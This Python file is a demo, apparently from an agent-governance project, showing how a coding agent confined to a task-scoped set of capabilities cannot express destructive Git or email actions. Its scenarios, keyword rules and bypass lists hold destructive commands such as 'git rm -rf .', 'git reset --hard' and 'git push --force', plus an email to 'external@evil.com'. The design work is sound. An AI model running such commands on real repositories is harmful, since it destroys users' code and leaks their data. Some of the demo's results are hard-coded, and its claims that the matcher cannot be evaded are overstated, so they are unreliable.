"""
copilot_git_governance_demo.py — Coding-agent governance via rendered capability worlds.

Demonstrates how the Agent Hypervisor model applies to GitHub Copilot-style
coding-agent workflows.  The central claim:

    A coding agent is safer when it operates in a *rendered capability world*
    than when it is given a broad raw command / Git surface.

The critical distinction is not about deny rules.  It is about whether a
dangerous action can be *expressed at all* in the actor-visible world.

    Permissions try to stop bad actions.
    Rendering removes them from the action space.

This PoC does not try to make the agent behave better.
It changes what actions exist in the actor-visible world.

Three scenarios are demonstrated:

  1. code-update     — routine feature-branch workflow
  2. release-safe    — release preparation with tags, without force-push
  3. reporting       — purpose-bound reporting (not raw email)

Usage:
    python examples/integrations/copilot_git_governance_demo.py

No external dependencies.  No LLM calls.  No subprocess execution.
Pure deterministic architectural demonstration.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Raw tool space
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class RawTool:
    """
    A primitive, unguarded operation in the raw tool space.

    Raw tools exist at the system level — before any ontology construction,
    before any rendering, before any task context is applied.  They represent
    raw capability: what the system *can* do, not what an agent *should* do.
    """
    name: str
    description: str
    is_destructive: bool = False


#: Full Git raw tool space — everything the system is capable of.
RAW_GIT_TOOLS: List[RawTool] = [
    RawTool("git_add",        "Stage files for commit",                    is_destructive=False),
    RawTool("git_commit",     "Record staged changes as a commit",         is_destructive=False),
    RawTool("git_push",       "Upload commits to remote",                  is_destructive=False),
    RawTool("git_rm",         "Remove files from working tree and index",  is_destructive=True),
    RawTool("git_reset",      "Move HEAD or unstage changes",              is_destructive=True),
    RawTool("git_clean",      "Remove untracked files from working tree",  is_destructive=True),
    RawTool("git_force_push", "Push, overwriting remote history",          is_destructive=True),
    RawTool("git_tag",        "Create an annotated release tag",           is_destructive=False),
]

#: Raw email tool — arbitrary recipient, arbitrary body.
RAW_EMAIL_TOOLS: List[RawTool] = [
    RawTool("send_email", "Send an email to any recipient with any body",  is_destructive=False),
]


# ---------------------------------------------------------------------------
# Rendered capabilities (actor-visible capability set)
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class RenderedCapability:
    """
    A task-scoped, semantically named action in the actor-visible capability set.

    RenderedCapabilities are what the agent *sees*.  Raw tools are invisible.
    A RenderedCapability is narrower than its source raw tool: it has a specific
    task-scoped name, bounded semantics, and no surface beyond its intent.

    If a dangerous raw tool has no RenderedCapability entry, it does not exist
    in the agent's world.  There is no string to type, no function to call.
    """
    name: str
    description: str
    derived_from: List[str]   # names of RawTools this wraps


# ---------------------------------------------------------------------------
# Semantic action matcher
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class SemanticCandidate:
    """
    A semantic action label extracted from a raw action string.

    The matcher identifies what the action string is *trying to do* at the
    semantic level, independent of syntax.  This is the stand-in for a
    full action-mapping layer.
    """
    name: str
    source_fragment: str   # the part of the action string that produced this


# Mapping table: (keyword triggers) → semantic candidate name.
# Order matters — more specific patterns first.
_GIT_SEMANTIC_RULES: List[Tuple[Tuple[str, ...], str]] = [
    # Destructive actions — must come before their non-destructive overlaps.
    (("git rm",),              "destructive_delete"),
    (("rm -rf",),              "destructive_delete"),
    (("git reset",),           "destructive_reset"),
    (("git clean",),           "destructive_clean"),
    (("git push --force",),    "force_push"),
    (("git push -f",),         "force_push"),
    # Safe actions.
    (("git add",),             "stage_changes"),
    (("git commit",),          "commit_changes"),
    (("git push",),            "push_changes"),
    (("git tag",),             "create_release_tag"),
]

_EMAIL_SEMANTIC_RULES: List[Tuple[Tuple[str, ...], str]] = [
    (("send_email",),          "send_email"),
]


def extract_semantic_candidates(action: str) -> List[SemanticCandidate]:
    """
    Identify the set of semantic actions a raw action string is attempting.

    Splits compound actions (e.g. shell pipelines joined by &&) and maps
    each fragment to a semantic candidate using handcrafted rules.

    This is a deliberate simplification — a production system would use
    a structured parser or AST-level analysis.  The goal here is clarity,
    not completeness.
    """
    # Split on && and ; to handle compound shell commands.
    fragments = [f.strip() for sep in ("&&", ";", "||") for f in action.split(sep)]
    # Re-split in case multiple separators are used.
    all_fragments: List[str] = []
    for frag in action.replace(";", "&&").replace("||", "&&").split("&&"):
        stripped = frag.strip()
        if stripped:
            all_fragments.append(stripped)

    all_rules = _GIT_SEMANTIC_RULES + _EMAIL_SEMANTIC_RULES
    candidates: List[SemanticCandidate] = []
    seen: set[str] = set()

    for fragment in all_fragments:
        fragment_lower = fragment.lower()
        matched = False
        for triggers, candidate_name in all_rules:
            if any(trigger in fragment_lower for trigger in triggers):
                if candidate_name not in seen:
                    candidates.append(SemanticCandidate(
                        name=candidate_name,
                        source_fragment=fragment,
                    ))
                    seen.add(candidate_name)
                matched = True
                break
        if not matched:
            # Unrecognised fragment — treat as unknown.
            unknown = f"unknown_action"
            if unknown not in seen:
                candidates.append(SemanticCandidate(
                    name=unknown,
                    source_fragment=fragment,
                ))
                seen.add(unknown)

    return candidates


# ---------------------------------------------------------------------------
# Capability world renderer
# ---------------------------------------------------------------------------

@dataclass
class TaskWorld:
    """
    A rendered capability world for a specific task context.

    The TaskWorld is what the agent operates in.  It contains only the
    capabilities that are meaningful and safe for the current task.
    Everything outside this world does not exist for the agent.

    In the Agent Hypervisor model this corresponds to:
      Layer 1 (Base Ontology)      — defines the safe capability vocabulary
      Layer 2 (Dynamic Projection) — selects the task-appropriate subset
    """
    task_name: str
    description: str
    raw_tools: List[RawTool]
    capabilities: Dict[str, RenderedCapability] = field(default_factory=dict)


def build_git_world(
    task_name: str,
    description: str,
    allowed_capabilities: List[str],
) -> TaskWorld:
    """
    Build a Git-domain TaskWorld with the specified rendered capabilities.

    The full rendering map defines which capabilities are possible at all.
    Passing a capability name in `allowed_capabilities` that has no render
    entry is silently ignored — the ontological boundary is the render map,
    not the allowlist.
    """
    # Full ontology-level render map for Git capabilities.
    # Dangerous raw tools (git_rm, git_reset, git_clean, git_force_push)
    # have no entry here by design.
    full_render_map: Dict[str, RenderedCapability] = {
        "stage_changes": RenderedCapability(
            name="stage_changes",
            description="Stage modified files for the upcoming commit.",
            derived_from=["git_add"],
        ),
        "commit_changes": RenderedCapability(
            name="commit_changes",
            description="Commit staged changes with a descriptive message.",
            derived_from=["git_commit"],
        ),
        "push_changes": RenderedCapability(
            name="push_changes",
            description="Push committed changes to the remote branch.",
            derived_from=["git_push"],
        ),
        "create_release_tag": RenderedCapability(
            name="create_release_tag",
            description="Create an annotated release tag on the current commit.",
            derived_from=["git_tag"],
        ),
        # force_push, destructive_delete, destructive_reset, destructive_clean
        # are NOT in this map.  They cannot be rendered, ever, by any task.
    }

    rendered: Dict[str, RenderedCapability] = {}
    for cap_name in allowed_capabilities:
        cap = full_render_map.get(cap_name)
        if cap is not None:
            rendered[cap.name] = cap

    return TaskWorld(
        task_name=task_name,
        description=description,
        raw_tools=RAW_GIT_TOOLS,
        capabilities=rendered,
    )


def build_reporting_world() -> TaskWorld:
    """
    Build a reporting-domain TaskWorld.

    The raw tool is `send_email` (arbitrary recipient).
    The rendered world provides only purpose-bound, pre-addressed senders.
    Arbitrary recipient email is not expressible.
    """
    render_map: Dict[str, RenderedCapability] = {
        "send_report_to_security": RenderedCapability(
            name="send_report_to_security",
            description="Send a structured report to the internal security team.",
            derived_from=["send_email"],
        ),
        "send_report_to_finance": RenderedCapability(
            name="send_report_to_finance",
            description="Send a structured report to the internal finance team.",
            derived_from=["send_email"],
        ),
        # send_email (generic, arbitrary recipient) has no rendered form.
        # The raw tool exists; no capability exposes it.
    }

    return TaskWorld(
        task_name="reporting",
        description="Send structured reports to approved internal recipients only.",
        raw_tools=RAW_EMAIL_TOOLS,
        capabilities=render_map,
    )


# ---------------------------------------------------------------------------
# Governance decision
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class CapabilityMatchResult:
    """Result of matching a semantic candidate against the rendered world."""
    candidate: SemanticCandidate
    matched_capability: Optional[RenderedCapability]

    @property
    def is_present(self) -> bool:
        return self.matched_capability is not None


@dataclass(frozen=True)
class GovernanceVerdict:
    """Final governance verdict for an attempted action in a TaskWorld."""
    allowed: bool
    reason: str
    candidate_results: List[CapabilityMatchResult]

    ALLOW = "ALLOWED"
    DENY  = "NO MATCHING CAPABILITY"


def evaluate_action(action: str, world: TaskWorld) -> GovernanceVerdict:
    """
    Evaluate whether an action is expressible in the given TaskWorld.

    Steps:
      1. Extract semantic candidates from the raw action string.
      2. Match each candidate against the rendered capability set.
      3. If every candidate has a matching capability → ALLOWED.
      4. If any candidate is absent from the rendered world → NO MATCHING CAPABILITY.

    The key property: absence is not a deny rule.  It is the absence of
    the action from the actor-visible world entirely.  Layer 3 (Execution
    Governance) never sees the request — it was eliminated at render time.
    """
    candidates = extract_semantic_candidates(action)

    results: List[CapabilityMatchResult] = []
    for cand in candidates:
        matched = world.capabilities.get(cand.name)
        results.append(CapabilityMatchResult(
            candidate=cand,
            matched_capability=matched,
        ))

    all_present = all(r.is_present for r in results)

    if all_present and results:
        return GovernanceVerdict(
            allowed=True,
            reason=GovernanceVerdict.ALLOW,
            candidate_results=results,
        )
    else:
        return GovernanceVerdict(
            allowed=False,
            reason=GovernanceVerdict.DENY,
            candidate_results=results,
        )


# ---------------------------------------------------------------------------
# Canonical scenarios
# ---------------------------------------------------------------------------

@dataclass
class Scenario:
    """A complete demo scenario: world + attempted action + expected outcome."""
    name: str
    world: TaskWorld
    attempted_action: str
    architectural_note: str


SCENARIOS: List[Scenario] = [
    Scenario(
        name="code-update",
        world=build_git_world(
            task_name="code-update",
            description="Stage, commit, and push code changes to a feature branch.",
            allowed_capabilities=["stage_changes", "commit_changes", "push_changes"],
        ),
        attempted_action='git rm -rf . && git commit -m "cleanup" && git push',
        architectural_note=(
            "The destructive action is not merely blocked by policy.\n"
            "  It is outside the actor-visible capability world rendered for task=code-update.\n"
            "  Dangerous action remains absent from this world.\n"
            "  Execution governance (Layer 3) never sees this request —\n"
            "  it was eliminated at render time (Layer 2)."
        ),
    ),
    Scenario(
        name="release-safe",
        world=build_git_world(
            task_name="release-safe",
            description="Prepare and publish a release: commit, tag, and push.",
            allowed_capabilities=[
                "stage_changes", "commit_changes", "push_changes", "create_release_tag"
            ],
        ),
        attempted_action="git push --force",
        architectural_note=(
            "force_push is absent from the rendered world for task=release-safe.\n"
            "  The agent cannot express a force-push — there is no capability to invoke.\n"
            "  The release workflow is intentionally bounded: it can tag and push,\n"
            "  but history-rewriting is outside this world entirely."
        ),
    ),
    Scenario(
        name="reporting",
        world=build_reporting_world(),
        attempted_action='send_email("external@evil.com", body)',
        architectural_note=(
            "The raw send_email tool accepts any recipient.\n"
            "  The rendered world provides only purpose-bound forms:\n"
            "  send_report_to_security and send_report_to_finance.\n"
            "  Arbitrary recipient email is not expressible in this world.\n"
            "  The ontology narrowing applies to recipient scope, not just Git operations.\n"
            "  The same architectural principle generalises across tool domains."
        ),
    ),
]


# ---------------------------------------------------------------------------
# Output formatting
# ---------------------------------------------------------------------------

WIDE = 62


def _line(label: str, value: str, width: int = 20) -> str:
    return f"  {label:<{width}} {value}"


def print_scenario(scenario: Scenario) -> None:
    """Print a fully structured, presentation-ready scenario block."""
    print()
    print("=" * WIDE)
    print(f"Scenario: {scenario.name}")
    print("=" * WIDE)

    # Raw tool space
    print()
    print("Raw tool space:")
    for tool in scenario.world.raw_tools:
        tag = "  [destructive]" if tool.is_destructive else ""
        print(f"  {tool.name}{tag}")

    # Rendered world
    print()
    print("Rendered actor-visible capability set:")
    if scenario.world.capabilities:
        for cap in scenario.world.capabilities.values():
            print(f"  {cap.name}")
    else:
        print("  (empty — no capabilities rendered)")

    # Attempted action
    print()
    print("Attempted action:")
    print(f"  {scenario.attempted_action}")

    # Evaluate
    verdict = evaluate_action(scenario.attempted_action, scenario.world)

    # Semantic candidates
    print()
    print("Semantic action candidates:")
    for r in verdict.candidate_results:
        print(f"  {r.candidate.name}")

    # Capability matching
    print()
    print("Capability matching:")
    max_name = max(len(r.candidate.name) for r in verdict.candidate_results)
    for r in verdict.candidate_results:
        status = "PRESENT" if r.is_present else "NOT PRESENT"
        print(f"  {r.candidate.name:<{max_name}}  ->  {status}")

    # Final result
    print()
    print("Final result:")
    if verdict.allowed:
        print("  ALLOWED")
    else:
        print("  NO MATCHING CAPABILITY")

    # Explanation
    print()
    print("Explanation:")
    for line in scenario.architectural_note.split("\n"):
        print(f"  {line}")
    print()


# ---------------------------------------------------------------------------
# Architectural summary
# ---------------------------------------------------------------------------

def print_summary() -> None:
    print()
    print("=" * WIDE)
    print("Architectural Summary")
    print("=" * WIDE)
    print()
    print("  All three scenarios share one architectural property:")
    print()
    print("    The dangerous action was not denied by a rule.")
    print("    It did not exist in the actor-visible world.")
    print()
    print("  Agent Hypervisor layer mapping:")
    print()
    print("    Layer 1  Base Ontology        —  defines the safe capability")
    print("             (design-time)            vocabulary for each domain")
    print()
    print("    Layer 2  Dynamic Projection   —  renders the task-appropriate")
    print("             (runtime)                subset for each agent context")
    print()
    print("    Layer 3  Execution Governance —  last-line policy + provenance")
    print("             (runtime)                check on the rendered set only")
    print()
    print("  Layers 1 and 2 handle dangerous actions by non-existence.")
    print("  Layer 3 handles edge cases within the already-safe rendered world.")
    print()
    print("  The problem is not only permissions.")
    print("  The problem is the action space.")
    print()
    print("  Permissions try to stop bad actions.")
    print("  Rendering removes them from the action space.")
    print()


# ---------------------------------------------------------------------------
# Interactive FAQ layer — executable objection scenarios
# ---------------------------------------------------------------------------

#: Simulated permissions allowlist for comparison scenarios.
_PERMISSIONS_ALLOWLIST: List[str] = ["git:add", "git:commit", "git:push", "git:rm"]

#: Token → permission-name mapping for permissions-model simulation.
_TOKEN_TO_PERM: List[Tuple[str, str]] = [
    ("git rm",     "git:rm"),
    ("git commit", "git:commit"),
    ("git push",   "git:push"),
    ("git add",    "git:add"),
    ("git reset",  "git:reset"),
    ("git clean",  "git:clean"),
    ("rm -rf",     "rm:rf"),
]


def _permissions_check_fragments(
    action: str,
    allowlist: List[str],
) -> List[Tuple[str, str, bool]]:
    """
    Simulate a token-based permissions check.

    Returns a list of (fragment, permission_token, is_allowed) triples.
    Each fragment is matched against the token map; the result records
    whether that token appears in the allowlist.
    """
    results: List[Tuple[str, str, bool]] = []
    fragments = [
        f.strip()
        for f in action.replace(";", "&&").replace("||", "&&").split("&&")
        if f.strip()
    ]
    for frag in fragments:
        frag_lower = frag.lower()
        for token, perm in _TOKEN_TO_PERM:
            if token in frag_lower:
                results.append((frag, perm, perm in allowlist))
                break
    return results


def _faq_header(title: str) -> None:
    """Print an FAQ scenario header."""
    print()
    print("=" * WIDE)
    print(f"Scenario: {title}")
    print("=" * WIDE)


def _faq_section(number: int, title: str) -> None:
    """Print a numbered section label."""
    print()
    print(f"[{number}] {title}")


def _print_key_takeaway() -> None:
    """Print the standard key takeaway block after each FAQ scenario."""
    print()
    print("-" * WIDE)
    print("Key takeaway:")
    print()
    print("  Permissions try to stop bad actions.")
    print("  Rendering removes them from the action space.")
    print("-" * WIDE)


def _code_update_world() -> TaskWorld:
    """Return the canonical code-update world used across FAQ scenarios."""
    return build_git_world(
        task_name="code-update",
        description="Stage, commit, and push code changes to a feature branch.",
        allowed_capabilities=["stage_changes", "commit_changes", "push_changes"],
    )


def _print_raw_tool_space() -> None:
    """Print [1] RAW TOOL SPACE using the Git raw tools list."""
    _faq_section(1, "RAW TOOL SPACE")
    for tool in RAW_GIT_TOOLS:
        tag = "  [destructive]" if tool.is_destructive else ""
        print(f"    {tool.name}{tag}")


def _print_rendered_world(world: TaskWorld, label: str = "") -> None:
    """Print rendered capability names, optionally with a label."""
    prefix = f"    {label}: " if label else "    "
    for cap_name in world.capabilities:
        print(f"{prefix}{cap_name}")


# ---------------------------------------------------------------------------
# FAQ option 1 — Permissions vs rendering
# ---------------------------------------------------------------------------

def run_faq_option_1() -> None:
    """[1] Isn't this just better permissions?"""
    action = 'git rm -rf . && git commit && git push'
    world = _code_update_world()
    allowlist = _PERMISSIONS_ALLOWLIST

    _faq_header("permissions-vs-rendering")

    _print_raw_tool_space()

    _faq_section(2, "RENDERED ACTOR WORLD")
    print("    Model A (Bash + Permissions):")
    print(f"      allowlist: {allowlist}")
    print()
    print("    Model B (Rendered world):")
    _print_rendered_world(world, label="")

    _faq_section(3, "ATTEMPTED ACTION")
    print(f"    {action}")
    print()
    print("    (same action attempted in both models)")

    _faq_section(4, "SEMANTIC INTERPRETATION")
    candidates = extract_semantic_candidates(action)
    for c in candidates:
        print(f"    {c.source_fragment:<44}  ->  {c.name}")

    _faq_section(5, "CAPABILITY MATCHING")
    print("    Model A (Permissions):")
    perm_results = _permissions_check_fragments(action, allowlist)
    for _frag, perm, allowed in perm_results:
        status = "in allowlist  ->  PERMITTED"
        print(f"      {perm:<20}  ->  {status}")

    print()
    print("    Model B (Rendering):")
    verdict = evaluate_action(action, world)
    max_name = max(len(r.candidate.name) for r in verdict.candidate_results)
    for r in verdict.candidate_results:
        status = "PRESENT" if r.is_present else "NOT PRESENT"
        print(f"      {r.candidate.name:<{max_name}}  ->  {status}")

    _faq_section(6, "FINAL RESULT")
    print("    Model A (Permissions):  ALLOWED")
    print("    Model B (Rendering):    NO SUCH ACTION IN THIS WORLD")

    _faq_section(7, "INTERPRETATION")
    print("    Model A: git:rm is in the allowlist.")
    print("    'git rm -rf .' passes — each token is individually permitted.")
    print("    The dangerous action remains expressible.")
    print()
    print("    Model B: destructive_delete has no rendered capability.")
    print("    There is no vocabulary to invoke it.")
    print("    This is a different control point — not a better filter.")

    _print_key_takeaway()


# ---------------------------------------------------------------------------
# FAQ option 2 — Bypass attempts
# ---------------------------------------------------------------------------

def run_faq_option_2() -> None:
    """[2] What if the agent tries to bypass this?"""
    bypass_attempts = [
        "rm -rf .",
        "git clean -fd",
        "git reset --hard",
    ]
    world = _code_update_world()

    _faq_header("bypass-attempt")

    _print_raw_tool_space()

    _faq_section(2, "RENDERED ACTOR WORLD")
    _print_rendered_world(world)

    _faq_section(3, "ATTEMPTED ACTION")
    print("    Three bypass variants attempted:")
    for i, a in enumerate(bypass_attempts, 1):
        print(f"      {i}. {a}")

    _faq_section(4, "SEMANTIC INTERPRETATION")
    print("    Different strings — same semantic classes:")
    print()
    for a in bypass_attempts:
        candidates = extract_semantic_candidates(a)
        name = candidates[0].name if candidates else "unknown_action"
        print(f"    {a:<30}  ->  {name}")

    _faq_section(5, "CAPABILITY MATCHING")
    for a in bypass_attempts:
        verdict = evaluate_action(a, world)
        for r in verdict.candidate_results:
            status = "PRESENT" if r.is_present else "NOT PRESENT"
            print(f"    {r.candidate.name:<30}  ->  {status}")

    _faq_section(6, "FINAL RESULT")
    for a in bypass_attempts:
        print(f"    {a:<30}  ->  NO MATCHING CAPABILITY")

    _faq_section(7, "INTERPRETATION")
    print("    Different action strings collapse into the same semantic class.")
    print("    The rendering model does not match on strings.")
    print("    It matches on semantic intent.")
    print("    There is no string to craft that produces a different class.")
    print("    The action space itself is the boundary.")

    _print_key_takeaway()


# ---------------------------------------------------------------------------
# FAQ option 3 — Why not just remove git_rm?
# ---------------------------------------------------------------------------

def run_faq_option_3() -> None:
    """[3] Why not just remove git_rm?"""
    bypass_attempts = [
        "rm -rf .",
        "git clean -fd",
        "git reset --hard",
    ]
    world = _code_update_world()
    allowlist_no_rm = ["git:add", "git:commit", "git:push"]

    _faq_header("remove-git-rm")

    _print_raw_tool_space()

    _faq_section(2, "RENDERED ACTOR WORLD")
    print("    Permissions approach (git:rm removed from allowlist):")
    print(f"      allowlist: {allowlist_no_rm}")
    print()
    print("    Rendered world (code-update):")
    _print_rendered_world(world)

    _faq_section(3, "ATTEMPTED ACTION")
    print("    Three alternatives still available after git:rm is removed:")
    for i, a in enumerate(bypass_attempts, 1):
        print(f"      {i}. {a}")

    _faq_section(4, "SEMANTIC INTERPRETATION")
    for a in bypass_attempts:
        candidates = extract_semantic_candidates(a)
        name = candidates[0].name if candidates else "unknown_action"
        print(f"    {a:<30}  ->  {name}")

    _faq_section(5, "CAPABILITY MATCHING")
    print("    Permissions model (git:rm removed — but these were never listed):")
    no_rm_perm_map = [
        ("rm -rf",    "rm:rf"),
        ("git clean", "git:clean"),
        ("git reset", "git:reset"),
    ]
    for a in bypass_attempts:
        a_lower = a.lower()
        for token, perm in no_rm_perm_map:
            if token in a_lower:
                print(f"      {perm:<20}  ->  not in allowlist (never enumerated)")
                break
    print()
    print("    Rendered world:")
    for a in bypass_attempts:
        verdict = evaluate_action(a, world)
        for r in verdict.candidate_results:
            status = "NOT PRESENT" if not r.is_present else "PRESENT"
            print(f"      {r.candidate.name:<30}  ->  {status}")

    _faq_section(6, "FINAL RESULT")
    print("    Permissions model:")
    print("      git:rm removed — but rm:rf / git:clean / git:reset not blocked.")
    print("      Each new variant requires a new rule.  This is whack-a-mole.")
    print()
    print("    Rendered world:")
    for a in bypass_attempts:
        print(f"      {a:<30}  ->  NO SUCH ACTION IN THIS WORLD")

    _faq_section(7, "INTERPRETATION")
    print("    Removing git:rm from the allowlist is insufficient.")
    print("    rm -rf, git clean, git reset all achieve the same effect.")
    print("    The permissions model must enumerate every alternative.")
    print()
    print("    The rendered world has no such vocabulary at all.")
    print("    All destructive variants map to absent semantic classes.")
    print("    No enumeration required — the boundary is structural.")

    _print_key_takeaway()


# ---------------------------------------------------------------------------
# FAQ option 4 — Where is the real control point?
# ---------------------------------------------------------------------------

def run_faq_option_4() -> None:
    """[4] Where is the real control point here?"""
    _faq_header("control-point-analysis")

    _faq_section(1, "RAW TOOL SPACE")
    print("    git_add, git_commit, git_push, git_rm,")
    print("    git_reset, git_clean, git_force_push, git_tag")

    _faq_section(2, "RENDERED ACTOR WORLD")
    print("    code-update: stage_changes, commit_changes, push_changes")
    print("    (all destructive actions: absent)")

    _faq_section(3, "ATTEMPTED ACTION")
    print('    git rm -rf . && git commit && git push')

    _faq_section(4, "SEMANTIC INTERPRETATION")
    print("    destructive_delete, commit_changes, push_changes")

    _faq_section(5, "CAPABILITY MATCHING")
    print("    Permissions model:")
    print("      Agent  ->  Action  ->  Policy  ->  Deny")
    print()
    print("    Rendering model:")
    print("      Agent  ->  World  ->  Action  ->  (maybe) Policy")

    _faq_section(6, "FINAL RESULT")
    print("    Permissions model:  control AFTER the action is formed")
    print("    Rendering model:    control BEFORE the action exists")
    print()
    print("    Control happens BEFORE the action exists.")

    _faq_section(7, "INTERPRETATION")
    print("    In the permissions model, the agent can express the action.")
    print("    Policy evaluates it and decides.  Policy can be wrong.")
    print()
    print("    In the rendering model, the agent cannot express the action.")
    print("    There is nothing to evaluate.  Policy is irrelevant.")
    print()
    print("    The control point moved from Layer 3 (governance)")
    print("    to Layers 1-2 (ontology + projection).")
    print()
    print("    Layers 1-2 enforce by non-existence.")
    print("    Layer 3 handles edge cases in the already-safe rendered world.")

    _print_key_takeaway()


# ---------------------------------------------------------------------------
# FAQ option 5 — Case where permissions fail
# ---------------------------------------------------------------------------

def run_faq_option_5() -> None:
    """[5] Show me a case where permissions fail."""
    action = 'git rm -rf . && git commit -m "cleanup" && git push'
    allowlist = _PERMISSIONS_ALLOWLIST
    world = _code_update_world()

    _faq_header("permissions-failure")

    _print_raw_tool_space()

    _faq_section(2, "RENDERED ACTOR WORLD")
    print("    Permissions model (active in this scenario):")
    print(f"      allowlist: {allowlist}")

    _faq_section(3, "ATTEMPTED ACTION")
    print("    Instruction to agent:  'cleanup repo before push'")
    print()
    print("    Agent plan:")
    print(f"      {action}")

    _faq_section(4, "SEMANTIC INTERPRETATION")
    candidates = extract_semantic_candidates(action)
    for c in candidates:
        print(f"    {c.source_fragment:<44}  ->  {c.name}")

    _faq_section(5, "CAPABILITY MATCHING")
    print("    Permissions model (each step checked individually):")
    perm_results = _permissions_check_fragments(action, allowlist)
    for _frag, perm, allowed in perm_results:
        status = "PERMITTED" if allowed else "DENIED"
        print(f"      {perm:<20}  ->  in allowlist  ->  {status}")

    _faq_section(6, "FINAL RESULT")
    print("    Permissions model:  ALLOWED")
    print()
    print("    Each step is individually permitted.")
    print("    No structural protection against destructive compound actions.")

    _faq_section(7, "INTERPRETATION")
    print("    The permissions model checks each token in isolation.")
    print("    git:rm, git:commit, git:push — all individually allowed.")
    print("    The compound destructive plan passes unchanged.")
    print()
    print("    The rendered world removes destructive_delete from the vocabulary.")
    print("    No instruction can produce a destructive_delete action.")
    print("    The plan cannot be formed — not because it is denied,")
    print("    but because the vocabulary to form it does not exist.")

    _print_key_takeaway()


# ---------------------------------------------------------------------------
# FAQ option 6 — User-supplied attack
# ---------------------------------------------------------------------------

def run_faq_option_6(action: Optional[str] = None) -> None:
    """[6] Let me try my own attack."""
    world = _code_update_world()

    if action is None:
        print()
        print("  Enter attempted action:")
        print("  (examples: 'git rm -rf .', 'rm -rf .', 'git reset --hard')")
        print()
        try:
            action = input("  > ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            action = ""

    if not action:
        action = "git rm -rf ."
        print(f"  (using default: {action})")

    _faq_header("custom-attack")

    _print_raw_tool_space()

    _faq_section(2, "RENDERED ACTOR WORLD")
    _print_rendered_world(world)

    _faq_section(3, "ATTEMPTED ACTION")
    print(f"    {action}")

    _faq_section(4, "SEMANTIC INTERPRETATION")
    candidates = extract_semantic_candidates(action)
    if candidates:
        for c in candidates:
            print(f"    {c.source_fragment:<44}  ->  {c.name}")
    else:
        print("    (no semantic candidates extracted — treated as unknown_action)")

    _faq_section(5, "CAPABILITY MATCHING")
    verdict = evaluate_action(action, world)
    if verdict.candidate_results:
        max_name = max(len(r.candidate.name) for r in verdict.candidate_results)
        for r in verdict.candidate_results:
            status = "PRESENT" if r.is_present else "NOT PRESENT"
            print(f"    {r.candidate.name:<{max_name}}  ->  {status}")
    else:
        print("    (no candidates to match)")

    _faq_section(6, "FINAL RESULT")
    if verdict.allowed:
        print("    ALLOWED")
        print()
        print("    This action is expressible in the rendered world.")
    else:
        print("    NO SUCH ACTION IN THIS WORLD")
        print()
        absent = [r.candidate.name for r in verdict.candidate_results if not r.is_present]
        print(f"    Absent from rendered world: {absent}")

    _faq_section(7, "INTERPRETATION")
    if verdict.allowed:
        print("    All semantic candidates have matching capabilities.")
        print("    This action is within the rendered world's vocabulary.")
    else:
        print("    Different syntax, same result: the action is not expressible.")
        print("    The rendering boundary does not depend on string matching.")
        print("    It depends on semantic class membership.")

    _print_key_takeaway()


# ---------------------------------------------------------------------------
# Interactive FAQ menu
# ---------------------------------------------------------------------------

def print_faq_menu() -> None:
    """Print the interactive FAQ / objection menu."""
    print()
    print("=" * WIDE)
    print("What would you like to challenge?")
    print("=" * WIDE)
    print()
    print("  [1] Isn't this just better permissions?")
    print("  [2] What if the agent tries to bypass this?")
    print("  [3] Why not just remove git_rm?")
    print("  [4] Where is the real control point here?")
    print("  [5] Show me a case where permissions fail")
    print("  [6] Let me try my own attack")
    print("  [q] Quit")
    print()


def run_faq_loop() -> None:
    """
    Run the interactive FAQ loop.

    Presents an objection menu after the main demo.  Each selection
    executes a deterministic scenario that answers the objection through
    behavior, not explanation.
    """
    _handlers = {
        "1": run_faq_option_1,
        "2": run_faq_option_2,
        "3": run_faq_option_3,
        "4": run_faq_option_4,
        "5": run_faq_option_5,
        "6": run_faq_option_6,
    }

    while True:
        print_faq_menu()
        try:
            choice = input("  Select: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if choice in ("q", "quit", "exit"):
            print()
            print("  Demo complete.")
            print()
            break
        elif choice in _handlers:
            _handlers[choice]()
        else:
            print()
            print(f"  Unknown option: {choice!r}  —  enter 1-6 or q to quit.")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    print()
    print("=" * WIDE)
    print("Copilot / Coding-Agent Governance PoC")
    print("Agent Hypervisor — Rendered Capability Worlds")
    print("=" * WIDE)
    print()
    print("  Claim: a coding agent is safer when it operates in a")
    print("  rendered capability world than when it is given a broad")
    print("  raw Git / shell surface.")
    print()
    print("  This demo shows three scenarios in which a destructive or")
    print("  out-of-scope action resolves to NO MATCHING CAPABILITY —")
    print("  not because it was denied, but because it does not exist")
    print("  in the actor-visible world for that task.")

    for scenario in SCENARIOS:
        print_scenario(scenario)

    print_summary()
    run_faq_loop()


if __name__ == "__main__":
    main()
